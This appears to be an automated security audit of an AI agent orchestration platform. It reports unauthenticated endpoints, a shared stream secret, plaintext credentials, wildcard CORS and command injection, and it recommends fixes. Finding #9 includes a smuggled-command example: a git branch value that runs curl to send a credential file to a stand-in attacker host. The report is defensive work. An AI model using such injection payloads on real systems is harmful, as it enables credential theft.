# Security Audit Report — Electric Agent Studio

**Date:** 2026-03-11
**Scope:** `packages/studio`, `packages/protocol`, `packages/agent`
**Auditor:** Automated security analysis (Claude)

---

## Executive Summary

The Electric Agent Studio is a multi-agent orchestration platform where sandboxed AI agents (running in Fly.io Sprites or Docker) communicate via Durable Streams. The security model relies on:
- **Session tokens** (HMAC-SHA256) for per-session API authentication
- **Room membership** enforced at the application layer for agent-to-agent messaging
- **Sandbox isolation** via Sprites VMs or Docker containers
- **Client-side credential storage** (keys passed per-request, not persisted server-side)

This audit identified **5 critical**, **4 high**, and **6 medium** severity issues.

---

## Table of Contents

1. [CRITICAL: Unauthenticated Endpoints](#1-critical-unauthenticated-endpoints)
2. [CRITICAL: Single DS Secret = Cross-Room Stream Access](#2-critical-single-ds-secret--cross-room-stream-access)
3. [CRITICAL: `/api/hook` Endpoint Has No Authentication](#3-critical-apihook-endpoint-has-no-authentication)
4. [CRITICAL: Credentials Written to Sprite Filesystem in Plaintext](#4-critical-credentials-written-to-sprite-filesystem-in-plaintext)
5. [CRITICAL: OAuth Token Logged to Console](#5-critical-oauth-token-logged-to-console)
6. [HIGH: Room/Sandbox Routes Lack Auth Middleware](#6-high-roomsandbox-routes-lack-auth-middleware)
7. [HIGH: Session Token Minting for Any Linked Session](#7-high-session-token-minting-for-any-linked-session)
8. [HIGH: CORS `origin: "*"` on All Routes](#8-high-cors-origin--on-all-routes)
9. [HIGH: Command Injection via Project Name / Repo URL](#9-high-command-injection-via-project-name--repo-url)
10. [MEDIUM: `/api/provision-electric` Is Unauthenticated](#10-medium-apiprovision-electric-is-unauthenticated)
11. [MEDIUM: Room Message Routing Has No Cryptographic Enforcement](#11-medium-room-message-routing-has-no-cryptographic-enforcement)
12. [MEDIUM: DS Secret Passed to Every Sandbox](#12-medium-ds-secret-passed-to-every-sandbox)
13. [MEDIUM: No Expiry on Session Tokens](#13-medium-no-expiry-on-session-tokens)
14. [MEDIUM: Keychain Endpoint Leaks OAuth Tokens](#14-medium-keychain-endpoint-leaks-oauth-tokens)
15. [MEDIUM: Error Messages May Leak Internal State](#15-medium-error-messages-may-leak-internal-state)

---

## Detailed Findings

### 1. CRITICAL: Unauthenticated Endpoints

**Files:** `packages/studio/src/server.ts:1718-1788`, `packages/studio/src/server.ts:2108-2155`

**Description:**
Several sensitive endpoints have **no authentication at all**:

| Endpoint | Risk |
|---|---|
| `GET /api/sandboxes` | Lists all active sandboxes (session IDs, ports, project dirs) |
| `GET /api/sandboxes/:sessionId` | Reads sandbox details for any session |
| `POST /api/sandboxes` | Creates arbitrary sandboxes |
| `DELETE /api/sandboxes/:sessionId` | Destroys any sandbox |
| `POST /api/rooms` | Creates rooms without authentication |
| `GET /api/rooms/:id` | Reads room state (participants, session IDs) |
| `POST /api/rooms/:id/agents` | Adds agents to any room |
| `POST /api/rooms/:id/messages` | Sends messages to any room |
| `POST /api/rooms/:id/close` | Closes any room |
| `GET /api/rooms/:id/events` | Subscribes to any room's event stream |
| `POST /api/rooms/:id/sessions` | Adds existing sessions to rooms (has session token check, good) |
| `POST /api/rooms/:id/sessions/:sessionId/iterate` | Sends commands to any agent in any room |
| `POST /api/sessions` | Creates sessions (accepts API keys in body) |

**Impact:** Any network-adjacent attacker can enumerate sessions, read room state, inject messages into rooms, create/destroy sandboxes, and add rogue agents to existing rooms. This directly violates the requirement that "sandboxes cannot interfere with each other unless in the same room" — an attacker can simply add their agent to any room.

**Recommendation:**
- Add authentication middleware to all `/api/rooms/*` and `/api/sandboxes/*` routes
- Require a room token (derived from room ID) for all room-scoped operations
- Require a server-level admin token for session/sandbox creation
- At minimum, protect `POST /api/sessions` since it accepts API keys in the request body

---

### 2. CRITICAL: Single DS Secret = Cross-Room Stream Access

**File:** `packages/studio/src/streams.ts:43-95`

**Description:**
All Durable Stream connections use the **same `DS_SECRET`** for authorization:

```typescript
// Every stream (session, shared, room, registry) uses identical auth
headers: {
    Authorization: `Bearer ${config.secret}`,
}
```

The stream URL scheme is predictable:
- Session: `${url}/v1/stream/${serviceId}/session/${sessionId}`
- Room: `${url}/v1/stream/${serviceId}/room/${roomId}`
- Registry: `${url}/v1/stream/${serviceId}/registry`

**Impact:** If any single agent or sandbox gains access to the DS_SECRET (which they do — see finding #12), they can:
1. **Read any other session's stream** by constructing the URL with a known session ID
2. **Read any room's stream** by constructing the URL with a known room ID
3. **Write to any stream** (inject messages, fake events)
4. **Read the registry stream** to enumerate all rooms and sessions

This completely breaks the room-based isolation model. An agent in Room A can read all messages from Room B.

**Recommendation:**
- Use per-stream or per-room scoped tokens (JWT with claims scoping to specific stream paths)
- Never pass the master DS_SECRET to sandboxes
- Use a proxy pattern where the studio server mediates all stream access

---

### 3. CRITICAL: `/api/hook` Endpoint Has No Authentication

**File:** `packages/studio/src/server.ts:662-808`

**Description:**
The unified hook endpoint `POST /api/hook` accepts arbitrary JSON payloads **without any authentication**:

```typescript
app.post("/api/hook", async (c) => {
    const body = (await c.req.json()) as Record<string, unknown>
    // No auth check — anyone can post events
    // Auto-creates sessions on first request
})
```

Compare this to `POST /api/sessions/:id/hook-event` which properly validates a hook token.

**Impact:**
- An attacker can create unlimited sessions by posting `SessionStart` events
- Injected events appear in the UI as real agent events
- Could be used to phish users by injecting fake `ask_user_question` events
- DoS vector: flood the server with session creations

**Recommendation:**
- Add authentication to `/api/hook` (e.g., a shared secret or signed payload)
- Or require pre-registration: only accept events for existing sessions

---

### 4. CRITICAL: Credentials Written to Sprite Filesystem in Plaintext

**File:** `packages/studio/src/sandbox/sprites.ts:130-164`

**Description:**
API keys, OAuth tokens, and GitHub tokens are written to the sprite filesystem as shell environment variables in plaintext:

```typescript
if (opts?.oauthToken) {
    envVars.CLAUDE_CODE_OAUTH_TOKEN = opts.oauthToken
} else if (opts?.apiKey) {
    envVars.ANTHROPIC_API_KEY = opts.apiKey
}
if (opts?.ghToken) {
    envVars.GH_TOKEN = opts.ghToken
}

// Written to a file readable by all processes in the sprite
const envLines = Object.entries(envVars)
    .map(([k, v]) => `export ${k}=${JSON.stringify(v)}`)
    .join("\n")
const b64 = Buffer.from(envLines).toString("base64")
await sprite.execFile("bash", [
    "-c",
    `echo ${b64} | base64 -d > /etc/profile.d/electric-agent.sh`,
])
```

**Impact:**
- The AI agent running inside the sandbox has full access to these credentials
- If the agent is compromised (prompt injection), it can exfiltrate the API key and GitHub token
- The file `/etc/profile.d/electric-agent.sh` is world-readable
- The credentials persist on disk for the lifetime of the sprite

**User's requirement: "the server never stores user credentials"** — While the studio server process doesn't persist them to a database, they ARE persisted to the sandbox filesystem. This is a nuanced violation: the server-side Node.js process holds them in memory during sandbox creation and writes them to the sandbox.

**Recommendation:**
- Consider a credential proxy: sandbox requests go through the studio server which injects the auth header, so the sandbox never holds raw keys
- If direct credential access is unavoidable, use ephemeral environment variables (not files) and clear them after the process starts
- Set restrictive file permissions (0600) on credential files
- Document this as a known trade-off in the security model

---

### 5. CRITICAL: OAuth Token Logged to Console

**File:** `packages/studio/src/server.ts:2799-2801`

**Description:**
```typescript
console.log(
    `[dev] Loaded OAuth token from keychain: ${token.slice(0, 20)}...${token.slice(-10)}`,
)
```

**Impact:** The OAuth token's first 20 and last 10 characters are logged. Depending on token format and entropy distribution, this may be sufficient to reconstruct or brute-force the full token. Server logs are often stored in log aggregation systems with broader access.

**Recommendation:**
- Never log credentials, even partially
- Log only a confirmation like `[dev] Loaded OAuth token from keychain (length: ${token.length})`

---

### 6. HIGH: Room/Sandbox Routes Lack Auth Middleware

**Files:** `packages/studio/src/server.ts:2108-2601`

**Description:**
The auth middleware pattern at lines 439-465 only protects `/api/sessions/:id/*`. There is **no equivalent middleware** for:
- `/api/rooms/*` — All room operations are unprotected
- `/api/sandboxes/*` — All sandbox CRUD operations are unprotected
- `/api/shared-sessions/:id/*` — Protected, but only sub-routes, not all operations

The room token (`roomToken`) is returned from `POST /api/rooms` and `GET /api/rooms/join/:id/:code`, but is **never validated** on subsequent room API calls.

**Impact:** The room token is generated but never enforced. Any client that knows a room ID can perform all room operations without proving they're a member.

**Recommendation:**
- Add auth middleware for `/api/rooms/:id/*` that validates the room token
- Add auth middleware for `/api/sandboxes/*` (admin-level auth)
- Validate room membership before allowing `POST /api/rooms/:id/agents` and `POST /api/rooms/:id/messages`

---

### 7. HIGH: Session Token Minting for Any Linked Session

**File:** `packages/studio/src/server.ts:2009-2013`

**Description:**
```typescript
app.get("/api/shared-sessions/:id/sessions/:sessionId/token", (c) => {
    const sessionId = c.req.param("sessionId")
    const sessionToken = deriveSessionToken(config.streamConfig.secret, sessionId)
    return c.json({ sessionToken })
})
```

This endpoint mints a session token for **any arbitrary session ID** as long as the caller has a valid shared-session token. There is no check that the requested `sessionId` is actually linked to the shared session.

**Impact:** A user with access to any shared session can generate valid session tokens for **any session on the server**, not just those linked to their room. This is a privilege escalation path.

**Recommendation:**
- Verify that `sessionId` is actually linked to the shared session before minting a token
- Replay the shared session stream to check for a `session_linked` event for the requested session ID

---

### 8. HIGH: CORS `origin: "*"` on All Routes

**File:** `packages/studio/src/server.ts:376`

**Description:**
```typescript
app.use("*", cors({ origin: "*" }))
```

All API routes accept requests from any origin.

**Impact:**
- Any website visited by a user can make authenticated API calls to the studio server
- Combined with the credential endpoints (e.g., `/api/credentials/keychain`), a malicious website could steal OAuth tokens
- Enables cross-site request forgery for all mutation endpoints

**Recommendation:**
- Restrict CORS to known origins (the studio frontend URL)
- For development, use a configurable allowlist
- At minimum, don't allow `*` on credential-returning endpoints

---

### 9. HIGH: Command Injection via Project Name / Repo URL

**Files:** `packages/studio/src/sandbox/sprites.ts:107,380-381`, `packages/studio/src/server.ts:1102-1113`

**Description:**
User-controlled strings are interpolated into shell commands:

```typescript
// sprites.ts:107
const projectDir = `/home/agent/workspace/${projectName}`
await sprite.exec(`mkdir -p ${projectDir}`)

// sprites.ts:380-381
await this.exec(handle,
    `gh repo clone "${repoUrl}" "${targetDir}" 2>/dev/null || git clone "${repoUrl}" "${targetDir}"`)

// server.ts:1106 - sed with projectName
await config.sandbox.exec(handle,
    `cd '${handle.projectDir}' && sed -i 's/"name": "scaffold-base"/"name": "${projectName}"/' package.json`)
```

While `projectName` is sanitized (slug-like), `repoUrl` and `body.branch` in `createFromRepo` are not sanitized:

```typescript
// sprites.ts:384
await this.exec(handle, `cd ${targetDir} && git checkout ${opts.branch}`)
```

**Impact:** A malicious `branch` value like `main; curl attacker.com/exfil?key=$(cat /etc/profile.d/electric-agent.sh)` could execute arbitrary commands in the sandbox, exfiltrating credentials.

**Recommendation:**
- Use `execFile` with explicit argument arrays instead of string interpolation for all shell commands
- Validate and sanitize all user inputs (repo URLs, branch names, project names) against strict allowlists
- Use `--` to separate git options from arguments: `git checkout -- ${branch}`

---

### 10. MEDIUM: `/api/provision-electric` Is Unauthenticated

**File:** `packages/studio/src/server.ts:400-416`

**Description:**
The endpoint provisions real Electric Cloud resources (database + sync service) with no authentication. Each call creates actual cloud infrastructure.

**Impact:** Resource exhaustion / cost abuse. An attacker can repeatedly call this endpoint to provision unlimited databases.

**Recommendation:**
- Add authentication or at minimum implement request throttling
- Consider requiring a valid session token

---

### 11. MEDIUM: Room Message Routing Has No Cryptographic Enforcement

**File:** `packages/studio/src/room-router.ts`

**Description:**
Room isolation is enforced purely at the application layer via in-memory `Map<string, InternalParticipant>`. The `RoomRouter`:
1. Only delivers messages to participants in its `_participants` map
2. Only routes `assistant_message` events through `handleAgentOutput`

However:
- There is no cryptographic verification that a message originated from a legitimate participant
- The room stream itself is a plain Durable Stream — anyone with the DS_SECRET can append to it
- Message `from` fields are display names, not cryptographically signed identities

**Impact:** Combined with finding #2 (shared DS_SECRET), any entity with the DS secret can inject messages into a room stream that appear to come from any participant.

**Recommendation:**
- Sign messages before appending to the room stream
- Verify signatures on message delivery
- Or better: ensure only the studio server can write to room streams (proxy pattern)

---

### 12. MEDIUM: DS Secret Passed to Every Sandbox

**File:** `packages/studio/src/streams.ts:100-107`

**Description:**
```typescript
export function getStreamEnvVars(sessionId: string, config: StreamConfig): Record<string, string> {
    return {
        DS_URL: config.url,
        DS_SERVICE_ID: config.serviceId,
        DS_SECRET: config.secret,  // Master secret!
        SESSION_ID: sessionId,
    }
}
```

Although this function exists, it appears to not currently be called in the sprites flow (credentials are passed differently). However, its existence suggests it was designed to share the DS secret with sandboxes. The Sprites bridge connects to streams using the master secret, and agents inside sprites can potentially discover stream URLs from process environment or network traffic.

**Impact:** If agents access the DS secret (via env vars, network sniffing, or process inspection), they gain full access to all streams (see finding #2).

**Recommendation:**
- Generate per-session scoped tokens that only grant access to that session's stream
- Remove `getStreamEnvVars` or replace with scoped credentials

---

### 13. MEDIUM: No Expiry on Session Tokens

**File:** `packages/studio/src/session-auth.ts`

**Description:**
Session tokens are simple HMAC-SHA256 signatures with no expiry:
```typescript
export function deriveSessionToken(secret: string, sessionId: string): string {
    return crypto.createHmac("sha256", secret).update(sessionId).digest("hex")
}
```

**Impact:** Once a session token is obtained, it remains valid forever (or until the DS_SECRET is rotated). There is no revocation mechanism.

**Recommendation:**
- Include a timestamp in the HMAC input and validate freshness
- Or use JWTs with an `exp` claim
- Implement a token revocation mechanism

---

### 14. MEDIUM: Keychain Endpoint Leaks OAuth Tokens

**File:** `packages/studio/src/server.ts:2786-2809`

**Description:**
`GET /api/credentials/keychain` reads the Claude Code OAuth token from the macOS Keychain and returns it in a JSON response. This endpoint has no authentication.

**Impact:**
- Combined with CORS `origin: "*"`, any website can steal the user's Claude Code OAuth token
- The endpoint is meant for development convenience but is a significant security risk if the server is accessible on a network

**Recommendation:**
- Remove this endpoint in production builds
- Add authentication
- At minimum, restrict to localhost-only (check `c.req.header("Host")`)

---

### 15. MEDIUM: Error Messages May Leak Internal State

**Files:** Various locations in `server.ts`

**Description:**
Error responses sometimes include raw error messages:
```typescript
const message = err instanceof Error ? err.message : "Provisioning failed"
return c.json({ error: message }, 500)
```

**Impact:** Internal error messages may contain file paths, database connection strings, or stack traces that help attackers understand the system.

**Recommendation:**
- Return generic error messages to clients
- Log detailed errors server-side only

---

## Summary of Credential Handling

Per the user's requirement: **"the server never stores user credentials (Claude and GitHub keys)"**

| Aspect | Status | Details |
|---|---|---|
| Database storage | **PASS** | No database stores credentials |
| Server memory | **PARTIAL** | Credentials exist in-memory during request handling and in sandbox creation closures |
| Server filesystem | **PASS** | Server process doesn't write creds to disk |
| Sandbox filesystem | **FAIL** | Credentials are written to `/etc/profile.d/electric-agent.sh` as plaintext exports |
| Server logs | **FAIL** | OAuth token partially logged (first 20 + last 10 chars) |
| Durable Streams | **PASS** | Credentials are not written to event streams |

---

## Summary of Sandbox Isolation

Per the user's requirement: **"sandboxes cannot interfere with each other unless in the same room"**

| Aspect | Status | Details |
|---|---|---|
| VM isolation | **PASS** | Each sandbox runs in its own Sprites VM or Docker container |
| Network isolation | **PARTIAL** | Sprites have `domain: "*"` network policy (all outbound allowed). A sandbox could reach the studio API. |
| Stream isolation | **FAIL** | Single DS_SECRET means any entity with it can access any stream |
| Room enforcement | **FAIL** | Room APIs are unauthenticated — any caller can add agents to any room |
| API isolation | **FAIL** | No auth on sandbox/room APIs — any sandbox that can reach the studio server can manipulate rooms |

---

## Summary of Agent-to-Agent Isolation

Per the user's requirement: **"no agent can talk directly to another agent without being in the same room"**

| Aspect | Status | Details |
|---|---|---|
| Room router enforcement | **PASS** | `RoomRouter.deliverMessage()` only delivers to registered participants |
| API-level enforcement | **FAIL** | `POST /api/rooms/:id/messages` is unauthenticated — any agent can send to any room |
| Stream-level enforcement | **FAIL** | Agents could write directly to room Durable Streams if they have the DS_SECRET |
| Session iterate bypass | **FAIL** | `POST /api/rooms/:id/sessions/:sessionId/iterate` is unauthenticated — can command any agent in any room |

---

## Priority Remediation Roadmap

### Phase 1 (Immediate — blocks deployment)
1. **Add auth to room endpoints** — Validate room tokens on all `/api/rooms/:id/*` operations
2. **Add auth to `/api/hook`** — Require a shared secret or signed payload
3. **Add auth to sandbox endpoints** — Admin-level authentication for `/api/sandboxes/*`
4. **Fix CORS** — Restrict to known origins
5. **Stop logging credentials** — Remove the partial OAuth token log

### Phase 2 (Short-term — before GA)
1. **Scope DS credentials** — Use per-room/per-session JWTs instead of the master DS_SECRET
2. **Validate session linkage** — Check that session ID is linked before minting tokens
3. **Sanitize shell inputs** — Use `execFile` with argument arrays everywhere
4. **Credential proxy** — Avoid writing raw API keys to sandbox filesystems

### Phase 3 (Medium-term — hardening)
1. **Token expiry** — Add TTL to session/room tokens
2. **Message signing** — Cryptographically sign room messages
3. **Network policy** — Restrict sandbox outbound to only necessary endpoints
4. **Audit logging** — Log security-relevant events (auth failures, room modifications)
5. **Remove `/api/credentials/keychain`** in production
